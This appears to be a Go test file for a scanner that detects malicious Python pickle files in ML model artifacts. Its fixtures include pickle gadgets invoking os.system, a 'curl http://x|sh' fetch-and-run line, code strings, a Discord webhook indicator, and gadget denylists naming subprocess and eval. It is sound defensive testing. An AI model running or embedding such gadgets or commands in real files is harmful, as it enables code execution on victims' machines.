package pickle

import (
	"encoding/binary"
	"math"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"testing"

	"github.com/fr0g-66723067-io/sc4n/internal/artifact"
	"github.com/fr0g-66723067-io/sc4n/internal/limits"
	"github.com/fr0g-66723067-io/sc4n/internal/report"
	"github.com/fr0g-66723067-io/sc4n/internal/source"
)

func walk(t *testing.T, data []byte) (*Stream, []report.Finding) {
	t.Helper()
	return walkOpt(t, data, Options{}, limits.Default())
}

func walkOpt(t *testing.T, data []byte, opt Options, l limits.Limits) (*Stream, []report.Finding) {
	t.Helper()
	c := report.NewCollector(0)
	sess := artifact.NewSession(c, "", l)
	src := source.Mem("test.pkl", data)
	defer src.Close()
	st, err := Walk(sess.NewCtx("test.pkl", l), src, opt)
	if err != nil {
		t.Fatalf("Walk: %v", err)
	}
	return st, c.Findings()
}

// binUnicode builds a BINUNICODE opcode: a 4-byte little-endian length and the
// payload. The earlier form of these tests wrote a 1-byte length, which made the
// stream malformed and the test measure the wrong thing.
func binUnicode(s string) []byte {
	out := []byte{opBINUNICODE, 0, 0, 0, 0}
	binary.LittleEndian.PutUint32(out[1:], uint32(len(s)))
	return append(out, s...)
}

func ruleIDs(fs []report.Finding) []string {
	out := make([]string, 0, len(fs))
	for _, f := range fs {
		out = append(out, f.RuleID)
	}
	sort.Strings(out)
	return out
}

func hasRule(fs []report.Finding, id string) bool {
	for _, f := range fs {
		if f.RuleID == id {
			return true
		}
	}
	return false
}

func mustHave(t *testing.T, fs []report.Finding, ids ...string) {
	t.Helper()
	for _, id := range ids {
		if !hasRule(fs, id) {
			t.Fatalf("missing %s; findings = %v", id, ruleIDs(fs))
		}
	}
}

func mustNotHave(t *testing.T, fs []report.Finding, ids ...string) {
	t.Helper()
	for _, id := range ids {
		if hasRule(fs, id) {
			t.Fatalf("unexpected %s; findings = %v", id, ruleIDs(fs))
		}
	}
}

// TestOpcodeConstantsMatchTable keeps the named constants and the generated table
// from drifting: a wrong constant would silently mis-decode a stream.
func TestOpcodeConstantsMatchTable(t *testing.T) {
	for code, want := range opcodeConstants {
		if got := opTable[code].name; got != want {
			t.Errorf("constant 0x%02x is %s but the table entry is %q", code, want, got)
		}
	}
	if len(opcodeConstants) != 68 {
		t.Fatalf("the table has %d entries but %d constants are declared", len(opTable), len(opcodeConstants))
	}
	// Every opcode in the table must have a stack effect: the walker's default
	// branch reports "unhandled-opcode", so an opcode that reaches it is a bug.
	for code := 0; code < 256; code++ {
		if opTable[code].name == "" {
			continue
		}
		if _, handled := opcodeConstants[byte(code)]; !handled {
			t.Errorf("opcode %s (0x%02x) is in the table but has no constant", opTable[code].name, code)
		}
	}
}

// argumentBytes returns a minimal valid argument for each kind, which lets the test
// exercise every row of the decode switch instead of a hand-picked sample.
func argumentBytes(kind argKind) []byte {
	switch kind {
	case argNone:
		return nil
	case argUint1:
		return []byte{0x07}
	case argUint2:
		return []byte{0x07, 0x00}
	case argUint4, argInt4:
		return []byte{0x07, 0x00, 0x00, 0x00}
	case argUint8:
		return []byte{0x07, 0, 0, 0, 0, 0, 0, 0}
	case argFloat8:
		var b [8]byte
		binary.BigEndian.PutUint64(b[:], math.Float64bits(1.5))
		return b[:]
	case argDecimalnlShort:
		return []byte("12\n")
	case argDecimalnlLong:
		return []byte("12L\n")
	case argFloatnl:
		return []byte("1.5\n")
	case argStringnl:
		return []byte("'ab'\n")
	case argStringnlNoescape, argUnicodestringnl:
		return []byte("ab\n")
	case argStringnlNoescapePair:
		return []byte("mod\nname\n")
	case argString1, argBytes1, argUnicodestring1:
		return []byte{0x02, 'a', 'b'}
	case argString4, argBytes4, argUnicodestring4, argLong4:
		return []byte{0x02, 0, 0, 0, 0xff, 0x00}
	case argBytes8, argBytearray8, argUnicodestring8:
		return []byte{0x02, 0, 0, 0, 0, 0, 0, 0, 'a', 'b'}
	case argLong1:
		return []byte{0x02, 0xff, 0x00}
	default:
		return nil
	}
}

// TestDecodeArgCoversEveryKind drives the decoder with one valid argument per kind
// used by the table, and asserts that the decoder consumes exactly that argument.
func TestDecodeArgCoversEveryKind(t *testing.T) {
	seen := map[argKind]bool{}
	for code := 0; code < 256; code++ {
		info := opTable[code]
		if info.name == "" {
			continue
		}
		if seen[info.arg] {
			continue
		}
		seen[info.arg] = true
		arg := argumentBytes(info.arg)
		// decodeArg is called with pos pointing at the opcode byte, so the data
		// carries a filler opcode byte in front of the argument.
		data := append([]byte{info.name[0]}, arg...)
		w := &walker{data: data, lim: limits.Default(), mm: newMemo(len(data)), once: map[string]bool{}, structs: map[string]*structStat{}}
		got, next, err := w.decodeArg(info, 0)
		if err != nil {
			t.Errorf("argKind %d (%s) failed to decode: %v", info.arg, info.name, err)
			continue
		}
		if next != 1+len(arg) {
			t.Errorf("argKind %d (%s) consumed %d of %d bytes", info.arg, info.name, next, 1+len(arg))
		}
		if info.arg != argNone && got == nil {
			t.Errorf("argKind %d (%s) decoded to nil", info.arg, info.name)
		}
	}
	// Every kind the enum declares must be reachable from the table, or the walker
	// carries a branch no stream can reach.
	for k := argNone; k <= argLong4; k++ {
		if !seen[k] {
			t.Errorf("argKind %d is declared but no opcode uses it", k)
		}
	}
}

func TestBINFLOATIsBigEndian(t *testing.T) {
	var b [8]byte
	binary.BigEndian.PutUint64(b[:], math.Float64bits(1.5))
	data := append([]byte{opBINFLOAT}, b[:]...)
	w := &walker{data: data, lim: limits.Default(), mm: newMemo(len(data)), once: map[string]bool{}, structs: map[string]*structStat{}}
	got, next, err := w.decodeArg(opTable[opBINFLOAT], 0)
	if err != nil {
		t.Fatal(err)
	}
	if next != 9 {
		t.Fatalf("consumed %d bytes, want the opcode byte plus eight", next)
	}
	f, ok := got.(float64)
	if !ok || f != 1.5 {
		t.Fatalf("decoded %v, want 1.5 (BINFLOAT is the one big-endian fixed arg)", got)
	}
	// The little-endian reading of the same bytes is a different number, so a
	// little-endian implementation cannot pass this test.
	little := math.Float64frombits(binary.LittleEndian.Uint64(b[:]))
	if little == 1.5 {
		t.Fatal("the test bytes do not discriminate endianness")
	}
}

func TestNegativeAndTruncatedCountsAreStructuralViolations(t *testing.T) {
	// SHORT_BINUNICODE declares 200 bytes but carries none.
	data := append([]byte{opSHORT_BINUNICODE, 200}, []byte("ab")...)
	_, fs := walk(t, append([]byte{opPROTO, 4}, data...))
	if !hasRule(fs, "SC4N-PICKLE-STRUCT") || !hasRule(fs, "SC4N-PICKLE-INCOMPLETE") {
		t.Fatalf("truncated counted argument not reported: %v", ruleIDs(fs))
	}

	// LONG4 with a negative count (int4).
	neg := []byte{opPROTO, 2, opLONG4, 0xff, 0xff, 0xff, 0xff}
	_, fs = walk(t, neg)
	found := false
	for _, f := range fs {
		if f.RuleID == "SC4N-PICKLE-STRUCT" && strings.Contains(f.Evidence, "negative") {
			found = true
		}
	}
	if !found {
		t.Fatalf("negative LONG4 count not reported: %v", ruleIDs(fs))
	}
}

// TestWalkIsTotalAcrossMalformedBytes is the anti-evasion property: findings after
// a structural error must still be reported.
func TestWalkIsTotalAcrossMalformedBytes(t *testing.T) {
	// An unknown opcode followed by a genuine gadget: the walker must report the
	// gadget, not stop at the unknown byte.
	payload := append([]byte{opPROTO, 2, 0xff, 0xfe, 0xfd}, []byte("cos\nsystem\n(S'id'\ntR.")...)
	_, fs := walk(t, payload)
	mustHave(t, fs, "SC4N-PICKLE-STRUCT", "SC4N-PICKLE-INCOMPLETE", "SC4N-PICKLE-GLOBAL-CRITICAL", "SC4N-PICKLE-REDUCE")
}

func TestSegmentAndTrailingHandling(t *testing.T) {
	seg1 := []byte{opPROTO, 2, opEMPTY_DICT, opSTOP}
	seg2 := []byte{opPROTO, 4, opSHORT_BINUNICODE, 2, 'o', 's', opSHORT_BINUNICODE, 6, 's', 'y', 's', 't', 'e', 'm', opSTACK_GLOBAL, opSHORT_BINUNICODE, 2, 'i', 'd', opTUPLE1, opREDUCE, opSTOP}

	_, fs := walk(t, append(append([]byte{}, seg1...), seg2...))
	mustHave(t, fs, "SC4N-PICKLE-SEGMENT", "SC4N-PICKLE-GLOBAL-CRITICAL")

	// The same stream with a payload after STOP that is not a pickle.
	withTail := append(append([]byte{}, seg1...), []byte("#!/bin/sh\ncurl http://x|sh\n")...)
	_, fs = walk(t, withTail)
	mustHave(t, fs, "SC4N-PICKLE-TRAILING")
	for _, f := range fs {
		if f.RuleID == "SC4N-PICKLE-TRAILING" && !strings.Contains(f.Evidence, "shebang") {
			t.Fatalf("trailing evidence does not mention the shebang: %s", f.Evidence)
		}
	}

	// With TrailingIsStorage the container owns the tail and no trailing finding is
	// emitted: this is the legacy-torch and joblib contract.
	_, fs = walkOpt(t, withTail, Options{TrailingIsStorage: true, StorageDescription: "raw storage"}, limits.Default())
	mustNotHave(t, fs, "SC4N-PICKLE-TRAILING")
	mustNotHave(t, fs, "SC4N-PICKLE-SEGMENT")
}

func TestPrefixAndOffsetZero(t *testing.T) {
	gadget := append([]byte{opPROTO, 4}, []byte{opSHORT_BINUNICODE, 2, 'o', 's', opSHORT_BINUNICODE, 6, 's', 'y', 's', 't', 'e', 'm', opSTACK_GLOBAL, opSHORT_BINUNICODE, 2, 'i', 'd', opTUPLE1, opREDUCE, opSTOP}...)

	// A prefix that is plain text and cannot be confused with opcodes.
	prefixed := append([]byte("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"), gadget...)
	_, fs := walk(t, prefixed)
	mustHave(t, fs, "SC4N-PICKLE-PREFIX", "SC4N-PICKLE-GLOBAL-CRITICAL")

	// The protocol-0 gadget opens with GLOBAL at offset 0.
	_, fs = walk(t, []byte("cos\nsystem\n(S'id'\ntR."))
	mustHave(t, fs, "SC4N-PICKLE-OFFSET-ZERO", "SC4N-PICKLE-GLOBAL-CRITICAL", "SC4N-PICKLE-REDUCE")

	// A stream that merely starts with 'c' as ordinary text must not be claimed as
	// a pickle by the sniffer, so the walker's own findings are not what protects
	// this case: TestSniffRejectsSourceText covers the sniffer.
}

func TestFRAMEIsNotEnforced(t *testing.T) {
	// FRAME declares 4 bytes but the stream after it is longer; the reference
	// unpickler reads the length and then keeps reading, so enforcing it would
	// diverge from the loader and make the file look clean when it is not.
	data := []byte{opPROTO, 4, opFRAME}
	var fr [8]byte
	binary.LittleEndian.PutUint64(fr[:], 4)
	data = append(data, fr[:]...)
	data = append(data, []byte("cos\nsystem\n(S'id'\ntR.")...)
	_, fs := walk(t, data)
	mustHave(t, fs, "SC4N-PICKLE-GLOBAL-CRITICAL")
	// And no rule is emitted for FRAME itself.
	for _, f := range fs {
		if strings.Contains(f.Evidence, "FRAME") {
			t.Fatalf("FRAME produced a finding: %s", f.Evidence)
		}
	}
}

func TestProtocolIsNotEnforced(t *testing.T) {
	// Opcode/protocol agreement is deliberately not checked: the reference
	// unpickler consults the declared protocol only in find_class, so a stream
	// whose opcodes are newer than its PROTO argument loads fine and is not
	// evidence of anything. MEMOIZE is a protocol-4 opcode inside a stream that
	// declares protocol 2.
	data := []byte{opPROTO, 2, opEMPTY_DICT, opMEMOIZE, opSTOP}
	_, fs := walk(t, data)
	for _, f := range fs {
		if strings.Contains(f.Evidence, "proto-violation") {
			t.Fatalf("protocol violation reported although the reference does not enforce it: %s", f.Evidence)
		}
	}

	// A protocol-1 stream carries no PROTO opcode at all (CPython writes one only
	// from protocol 2), so it must walk without a structural violation and reach
	// its STOP with every opcode decoded.
	data = append([]byte{opEMPTY_DICT}, opBINPUT, 0, opEMPTY_DICT)
	data = append(data, opBINGET, 0, opSTOP)
	stream, fs := walk(t, data)
	if stream.StructErrors != 0 {
		t.Fatalf("protocol-1 stream reported structural errors: %v", ruleIDs(fs))
	}
	if !stream.SawStop || stream.Ops != 5 {
		t.Fatalf("protocol-1 stream did not walk to STOP: sawStop=%v ops=%d findings=%v",
			stream.SawStop, stream.Ops, ruleIDs(fs))
	}
}

func TestStackDepthBudgetStopsTheWalk(t *testing.T) {
	l := limits.Default()
	l.MaxStackDepth = 4
	data := []byte{opPROTO, 2}
	for range 10 {
		data = append(data, opEMPTY_DICT)
	}
	data = append(data, opSTOP)
	_, fs := walkOpt(t, data, Options{}, l)
	mustHave(t, fs, "SC4N-PICKLE-STACK")
}

func TestMemoHoleAndUnderflow(t *testing.T) {
	// GET(9) with nothing in the memo.
	_, fs := walk(t, []byte{opPROTO, 2, opBINPUT, 9, opSTOP})
	mustHave(t, fs, "SC4N-PICKLE-STRUCT")

	_, fs = walk(t, []byte{opPROTO, 2, opREDUCE, opSTOP})
	mustHave(t, fs, "SC4N-PICKLE-STRUCT")
}

func TestCodeStringRuleRequiresBothSignalAndLength(t *testing.T) {
	cases := []struct {
		text string
		want bool
	}{
		{"if not 'hypervisor' in open('/proc/cpuinfo').read(): import os; os.system('id')", true},
		{"__import__('os').system('id')", true},
		{"for x in range(10): print(x)", true},
		{"model_type", false},
		{"bert-base-uncased", false},
		{"This is a description of the model, stored as metadata.", false},
		{"short", false},
	}
	for _, tc := range cases {
		got := looksLikeCode(tc.text) != ""
		if got != tc.want {
			t.Errorf("looksLikeCode(%q) = %v, want %v", tc.text, got, tc.want)
		}
	}
}

func TestAllowlistPolicy(t *testing.T) {
	cases := []struct {
		module, name string
		want         AllowVerdict
	}{
		{"collections", "OrderedDict", AllowDefault},
		{"torch.nn.parameter", "Parameter", AllowDefault},
		{"torch", "Tensor", AllowDefault},
		{"torch._utils", "_rebuild_tensor_v2", AllowDefault},
		{"torch", "float32", AllowDefault},
		{"torch", "uint7", AllowDefault},
		{"torch", "DoubleStorage", AllowDefault},
		{"torch", "per_channel_affine", AllowDefault},
		{"_codecs", "encode", AllowDefault},
		{"builtins", "bytearray", AllowDefault},
		{"builtins", "complex", AllowDefault},
		{"torch._tensor", "_rebuild_from_type_v2", AllowDefault},
		// The nested/DTensor families are accepted only when the owning submodule
		// is imported, which a static scan cannot see.
		{"torch.distributed.tensor", "DTensor", AllowConditional},
		// Blocked modules are checked before the allowlist, so even an
		// allowlist-looking name in them is never loadable.
		{"os", "OrderedDict", AllowBlocked},
		{"posix", "system", AllowBlocked},
		{"sys", "modules", AllowBlocked},
		{"nt", "system", AllowBlocked},
		// Everything else is outside the allowlist.
		{"numpy", "load", AllowNo},
		{"subprocess", "Popen", AllowNo},
		{"pickle", "loads", AllowNo},
	}
	for _, tc := range cases {
		if got := isAllowed(tc.module, tc.name); got != tc.want {
			t.Errorf("isAllowed(%s.%s) = %s, want %s", tc.module, tc.name, got, tc.want)
		}
	}
}

func TestNameMappingMatchesTheLoader(t *testing.T) {
	cases := []struct {
		module, name         string
		wantModule, wantName string
		wantRemapped         bool
	}{
		{"__builtin__", "xrange", "builtins", "range", true},
		{"__builtin__", "unicode", "builtins", "str", true},
		{"UserDict", "IterableUserDict", "collections", "UserDict", true},
		{"StringIO", "StringIO", "io", "StringIO", true},
		{"torch._utils", "_rebuild_tensor_v2", "torch._utils", "_rebuild_tensor_v2", false},
	}
	for _, tc := range cases {
		m, n, remapped := resolveGlobal(tc.module, tc.name)
		if m != tc.wantModule || n != tc.wantName || remapped != tc.wantRemapped {
			t.Errorf("resolveGlobal(%s.%s) = %s.%s (remapped %v), want %s.%s (%v)",
				tc.module, tc.name, m, n, remapped, tc.wantModule, tc.wantName, tc.wantRemapped)
		}
	}
}

// TestGadgetSubtreeMatching is the CVE-2025-10157 regression: an exact-module check
// let asyncio.subprocess slip past a denylist entry for asyncio.
func TestGadgetSubtreeMatching(t *testing.T) {
	cases := []struct {
		module, name string
		want         GadgetClass
	}{
		{"asyncio.subprocess", "create_subprocess_shell", GadgetDirect},
		{"asyncio", "subprocess", GadgetDirect},
		{"asyncio", "get_event_loop", GadgetDirect},
		{"numpy.f2py.crackfortran", "myeval", GadgetLibrary},
		{"numpy.f2py.crackfortran.myeval", "inner", GadgetLibrary},
		{"numpy.testing._private.utils", "runstring", GadgetLibrary},
		{"pydoc", "pipepager", GadgetLibrary},
		{"logging.config", "_install_handlers", GadgetLibrary},
		{"xmlrpc.server", "resolve_dotted_attribute", GadgetLibrary},
		{"sympy", "sympify", GadgetLibrary},
		{"numpy.f2py.capi_maps", "getinit", GadgetLibrary},
		{"pickletools", "genops", GadgetLibrary},
		{"functools", "reduce", GadgetDirect},
		{"builtins", "eval", GadgetDirect},
		{"posix", "system", GadgetDirect},
		{"sympy", "sympify", GadgetLibrary},
		{"zlib", "decompress", GadgetLibrary},
		{"base64", "b64decode", GadgetLibrary},
		{"numpy", "array", GadgetUnknownCallable},
		{"sklearn.ensemble", "_forest", GadgetUnknownCallable},
	}
	for _, tc := range cases {
		got := classifyGadget(tc.module, tc.name)
		if got.Class != tc.want {
			t.Errorf("classifyGadget(%s.%s) = %s (%s), want %s",
				tc.module, tc.name, got.Class, got.Entry, tc.want)
		}
	}

	// Every table entry must be reachable through subtree matching, and the
	// subtree rule must be what makes it reachable: a module that is a prefix of a
	// denylisted package but not inside it must not match.
	if !moduleSubtreeMatches("os.path", "os") {
		t.Fatal("os.path must match the os subtree")
	}
	if moduleSubtreeMatches("oscar", "os") {
		t.Fatal("a module that merely starts with the same letters must not match")
	}
}

func TestPersistentIDShape(t *testing.T) {
	storageTuple := containerOf(kTuple, []Val{{kind: kStr, text: "storage"}, {kind: kStr, text: "FloatStorage"}}, 2)
	if !isPersistentStorageID(storageTuple) {
		t.Fatal("the (\"storage\", …) tuple must be accepted")
	}
	other := containerOf(kTuple, []Val{{kind: kStr, text: "elsewhere"}}, 1)
	if isPersistentStorageID(other) {
		t.Fatal("a non-storage persistent id must be rejected")
	}
	if !isPersistentStorageID(Val{kind: kInt, text: "3"}) {
		t.Fatal("the loader accepts a bare int persistent id, and the walker must model that")
	}
	if isPersistentStorageID(Val{kind: kList}) {
		t.Fatal("a list persistent id must be rejected")
	}

	// The rule must fire for a non-storage persistent id.
	_, fs := walk(t, []byte{opPROTO, 2, opEMPTY_TUPLE, opBINPERSID, opSTOP})
	mustHave(t, fs, "SC4N-PICKLE-PERSID")
}

func TestWeightsOnlyOpcodeSet(t *testing.T) {
	accepted := []byte{opPROTO, opSTOP, opGLOBAL, opREDUCE, opBUILD, opEMPTY_DICT, opSETITEMS, opBINUNICODE, opBININT, opBINGET, opBINPUT, opBINPERSID, opLONG1, opNEWOBJ, opAPPEND, opAPPENDS, opSETITEM, opMARK, opTUPLE, opTUPLE1, opTUPLE2, opTUPLE3, opNONE, opNEWTRUE, opNEWFALSE, opEMPTY_TUPLE, opEMPTY_LIST, opEMPTY_SET, opBININT1, opBININT2, opBINFLOAT, opLONG_BINPUT, opLONG_BINGET}
	for _, code := range accepted {
		if requiresUnsafeLoader(code) {
			t.Errorf("%s must be inside the weights-only accepted set", opTable[code].name)
		}
	}
	unsafe := []byte{opSTACK_GLOBAL, opINST, opOBJ, opNEWOBJ_EX, opEXT1, opEXT2, opEXT4, opPERSID, opFRAME, opMEMOIZE, opLONG4, opBINBYTES, opBINUNICODE8, opBYTEARRAY8, opNEXT_BUFFER, opREADONLY_BUFFER, opSHORT_BINUNICODE, opSHORT_BINBYTES, opDUP, opPOP, opPUT, opGET, opLIST, opDICT, opFROZENSET, opADDITEMS, opSTRING, opBINSTRING, opUNICODE, opLONG, opINT, opFLOAT}
	for _, code := range unsafe {
		if !requiresUnsafeLoader(code) {
			t.Errorf("%s must be outside the weights-only accepted set", opTable[code].name)
		}
	}
}

func TestSafeGlobalsOnlyFiresWhenNothingIsAllowlisted(t *testing.T) {
	// A stream whose only global is allowlisted must not ask the user for anything.
	data := append([]byte{opPROTO, 2}, []byte("ctorch._utils\n_rebuild_tensor_v2\n")...)
	data = append(data, opSTOP)
	_, fs := walk(t, data)
	mustNotHave(t, fs, "SC4N-PICKLE-SAFE-GLOBALS")
	mustNotHave(t, fs, "SC4N-PICKLE-GLOBAL-UNKNOWN", "SC4N-PICKLE-GLOBAL-CRITICAL", "SC4N-PICKLE-GLOBAL-HIGH")

	// A stream whose only global is unknown must.
	_, fs = walk(t, []byte{opPROTO, 2, opGLOBAL, 'a', 'b', '\n', 'c', 'd', '\n', opSTOP})
	mustHave(t, fs, "SC4N-PICKLE-SAFE-GLOBALS", "SC4N-PICKLE-GLOBAL-UNKNOWN")
}

func TestOneGlobalProducesOneFinding(t *testing.T) {
	// A state_dict references one rebuild function once per tensor. The finding
	// list must name it once, or a 300-tensor checkpoint produces 300 identical
	// findings and the finding cap becomes the report.
	data := []byte{opPROTO, 2, opEMPTY_DICT, opMARK}
	for i := range 20 {
		data = append(data, binUnicode("k"+string(rune('a'+i)))...)
		data = append(data, []byte("ctorch._utils\n_rebuild_tensor_v2\n")...)
		data = append(data, opEMPTY_TUPLE, opREDUCE)
	}
	data = append(data, opSETITEMS, opSTOP)
	_, fs := walk(t, data)
	n := 0
	for _, f := range fs {
		if f.RuleID == "SC4N-PICKLE-GLOBAL-UNKNOWN" {
			n++
		}
	}
	if n != 0 {
		t.Fatalf("allowlisted global reported %d times", n)
	}
	for _, f := range fs {
		if f.RuleID == "SC4N-PICKLE-REDUCE" {
			t.Fatalf("an allowlisted REDUCE must not be reported: %s", f.Evidence)
		}
	}
}

func TestBuildOnAllowlistedClassIsNotReported(t *testing.T) {
	// Tensor + BUILD is the legitimate legacy-unpickling path.
	data := []byte{opPROTO, 2}
	data = append(data, []byte("ctorch\nTensor\n")...)
	data = append(data, opEMPTY_DICT, opBUILD, opSTOP)
	_, fs := walk(t, data)
	mustNotHave(t, fs, "SC4N-PICKLE-BUILD-STATE")

	// A BUILD on an unknown class is a rejection.
	data = []byte{opPROTO, 2}
	data = append(data, []byte("cnumpy.core.multiarray\n_reconstruct\n")...)
	data = append(data, opEMPTY_DICT, opBUILD, opSTOP)
	_, fs = walk(t, data)
	mustHave(t, fs, "SC4N-PICKLE-BUILD-STATE")
}

func TestAppendTarget(t *testing.T) {
	data := append([]byte{opPROTO, 2, opEMPTY_DICT}, binUnicode("x")...)
	data = append(data, opAPPEND, opSTOP)
	_, fs := walk(t, data)
	mustHave(t, fs, "SC4N-PICKLE-APPEND-TARGET")
}

func TestUnescape(t *testing.T) {
	got, err := unescape([]byte(`a\x41\n\t\\z`))
	if err != nil {
		t.Fatalf("unescape: %v", err)
	}
	if string(got) != "aA\n\t\\z" {
		t.Fatalf("unescape = %q", got)
	}
	// An unknown escape is reported and kept verbatim rather than aborting.
	got, err = unescape([]byte(`a\qz`))
	if err == nil {
		t.Fatal("an unknown escape must be reported")
	}
	if string(got) != `a\qz` {
		t.Fatalf("an unknown escape must be kept verbatim so the walk continues, got %q", got)
	}
}

func TestSniffAcceptsPicklesAndRejectsSourceText(t *testing.T) {
	cases := []struct {
		name string
		data []byte
		want bool
	}{
		{"proto4 gadget", append([]byte{opPROTO, 4}, []byte{opSHORT_BINUNICODE, 2, 'o', 's', opSHORT_BINUNICODE, 6, 's', 'y', 's', 't', 'e', 'm', opSTACK_GLOBAL, opSHORT_BINUNICODE, 2, 'i', 'd', opTUPLE1, opREDUCE, opSTOP}...), true},
		{"proto0 gadget", []byte("cos\nsystem\n(S'id'\ntR."), true},
		{"python source", []byte("class Foo:\n    def bar(self):\n        return 1\n"), false},
		{"python source with c", []byte("copy the file\nand then\n"), false},
		{"empty", nil, false},
		{"one byte", []byte{opPROTO}, false},
		{"proto out of range", []byte{opPROTO, 99, opSTOP}, false},
		{"text", []byte("hello world, this is a readme\n"), false},
	}
	for _, tc := range cases {
		s := source.Mem(tc.name, tc.data)
		got, ok := sniff(s, limits.Default())
		s.Close()
		if ok != tc.want || (ok && got != artifact.FormatPickle) {
			t.Errorf("sniff(%s) = %s, %v; want pickle=%v", tc.name, got, ok, tc.want)
		}
	}
}

func FuzzPickleWalk(f *testing.F) {
	f.Add([]byte("cos\nsystem\n(S'id'\ntR."))
	f.Add([]byte{opPROTO, 4, opEMPTY_DICT, opSTOP})
	f.Add([]byte{opPROTO, 2, opEMPTY_DICT, opMEMOIZE, opBINPUT, 3, opGET, 3, opSTOP})
	f.Add([]byte{opPROTO, 4, opFRAME, 0, 0, 0, 0, 0, 0, 0, 0, opSTOP})
	f.Add([]byte{opPROTO, 5, opSHORT_BINUNICODE, 3, 'a', 'b', 'c', opNEXT_BUFFER, opREADONLY_BUFFER, opSTOP})
	f.Add([]byte{opMARK, opMARK, opTUPLE, opSTOP})
	f.Add([]byte{opPROTO, 2, opBINUNICODE, 0xff, 0xff, 0xff, 0xff})
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 1<<16 {
			return
		}
		c := report.NewCollector(0)
		l := limits.Default()
		l.MaxStackDepth = 4096
		sess := artifact.NewSession(c, "", l)
		src := source.Mem("fuzz", data)
		defer src.Close()
		// The invariants are: no panic, bounded work, and a deterministic result.
		first, err := Walk(sess.NewCtx("fuzz", l), src, Options{})
		if err != nil {
			t.Fatalf("Walk: %v", err)
		}
		if first.Ops > 1<<20 {
			t.Fatalf("opcode count %d for %d bytes", first.Ops, len(data))
		}
		c2 := report.NewCollector(0)
		sess2 := artifact.NewSession(c2, "", l)
		second, err := Walk(sess2.NewCtx("fuzz", l), src, Options{})
		if err != nil {
			t.Fatalf("second Walk: %v", err)
		}
		if first.Ops != second.Ops {
			t.Fatalf("Walk is not deterministic: %+v vs %+v", first, second)
		}
	})
}

// binBytes builds a BINBYTES opcode (a 4-byte little-endian length + payload).
func binBytes(b []byte) []byte {
	out := []byte{opBINBYTES, 0, 0, 0, 0}
	binary.LittleEndian.PutUint32(out[1:], uint32(len(b)))
	return append(out, b...)
}

// TestLargeConstantIsScannedWhole pins the F15 fix: the scan used to stop at
// maxRetainString (64 KiB) *before* the indicator engine ran, so an indicator past
// that point of a large constant was never seen.
//
// The assertion is on the hook rather than on a rule ID because this package's
// test binary has no indicator table (internal/stringscan installs the hook, and
// importing it here would be an import cycle). What the defect was about is
// exactly what the hook sees: how many bytes reach the engine.
func TestLargeConstantIsScannedWhole(t *testing.T) {
	body := make([]byte, 100_000)
	for i := range body {
		body[i] = 'A'
	}
	copy(body[70_000:], "https://discord.com/api/webhooks/123/abc")
	data := append([]byte{opPROTO, 4}, binBytes(body)...)
	data = append(data, opSTOP)

	oldBytes, oldString := BytesScan, StringScan
	defer func() { BytesScan, StringScan = oldBytes, oldString }()
	var scanned int
	note := func(n int) {
		if n > scanned {
			scanned = n
		}
	}
	BytesScan = func(_ *report.Sink, _ int64, b []byte) { note(len(b)) }
	StringScan = func(_ *report.Sink, _ int64, s string) { note(len(s)) }

	_, fs := walk(t, data)
	if scanned != len(body) {
		t.Fatalf("the indicator engine saw %d of %d bytes; a constant larger than maxRetainString must be scanned whole", scanned, len(body))
	}

	// The same for a constant that is binary, which takes the in-place path.
	binaryBody := make([]byte, 100_000)
	copy(binaryBody, "\x00\x01\x02\x03")
	copy(binaryBody[70_000:], "https://discord.com/api/webhooks/123/abc")
	scanned = 0
	data = append([]byte{opPROTO, 4}, binBytes(binaryBody)...)
	data = append(data, opSTOP)
	_, fs = walk(t, data)
	if scanned != len(binaryBody) {
		t.Fatalf("the indicator engine saw %d of %d bytes of a binary constant", scanned, len(binaryBody))
	}
	// The retention budget is a separate concern and still applies: the value's
	// length is recorded, and what is kept is capped.
	if !hasRule(fs, "SC4N-PICKLE-REQUIRES-UNSAFE-LOADER") {
		t.Fatalf("unexpected findings: %v", ruleIDs(fs))
	}
}

// TestCodeStringInBinaryConstantIsSeen pins the F16 fix: a REDUCE argument whose
// head is binary leaves text empty on the no-decode path, which made the
// code-string rule blind to the ShadowPickle shape with a padded payload.
//
// It also pins the round-7 correction: each text run is tested on its own, so two
// short fragments separated by binary padding are not joined (with an invented
// newline) into a "string" the artifact does not contain.
func TestCodeStringInBinaryConstantIsSeen(t *testing.T) {
	payload := append(make([]byte, 4096), []byte("import os\nos.system('id')\n")...)

	build := func(body []byte) []byte {
		data := []byte{opPROTO, 4}
		data = append(data, binUnicode("collections")...)
		data = append(data, binUnicode("OrderedDict")...)
		data = append(data, opSTACK_GLOBAL, opMARK)
		data = append(data, binBytes(body)...)
		data = append(data, opTUPLE, opREDUCE, opSTOP)
		return data
	}

	_, fs := walk(t, build(payload))
	mustHave(t, fs, "SC4N-PICKLE-CODE-STRING")

	// The same payload without the binary head must be reported too: the fix must
	// not have moved the detection to a different shape.
	_, fs = walk(t, build([]byte("import os\nos.system('id')\n")))
	mustHave(t, fs, "SC4N-PICKLE-CODE-STRING")

	// Two fragments under codeStringMinBytes separated by binary padding are two
	// values, not source: the join put '\n' between them and the evidence quoted
	// the assembled string.
	split := append([]byte("import os"), make([]byte, 8)...)
	split = append(split, []byte("os.system('id')")...)
	_, fs = walk(t, build(split))
	mustNotHave(t, fs, "SC4N-PICKLE-CODE-STRING")
}

// TestMemoAliasNeedsDistinctSlots pins the rule's semantics: a name bound once
// and read per tensor is a benign state_dict, and a name stored in two memo slots
// is a benign multi-object stream — joblib's NumpyArrayWrapper emits its own
// STACK_GLOBAL numpy.dtype per array, so counting slots reported an ordinary
// sklearn model as high. What the rule is about is two *routes* to one name.
func TestMemoAliasNeedsDistinctSlots(t *testing.T) {
	global := func() []byte {
		data := []byte{opPROTO, 2}
		data = append(data, binUnicode("torch._utils")...)
		data = append(data, binUnicode("_rebuild_tensor_v2")...)
		return append(data, opSTACK_GLOBAL)
	}

	// One binding, two reads: no finding.
	data := global()
	data = append(data, opBINPUT, 0, opBINGET, 0, opBINGET, 0, opSTOP)
	_, fs := walk(t, data)
	mustNotHave(t, fs, "SC4N-PICKLE-MEMO-ALIAS")

	// One route, two distinct slots: still no finding. The same name stored
	// twice is what every serializer that rebuilds a global per object produces.
	data = global()
	data = append(data, opBINPUT, 0, opBINPUT, 1, opSTOP)
	_, fs = walk(t, data)
	mustNotHave(t, fs, "SC4N-PICKLE-MEMO-ALIAS")

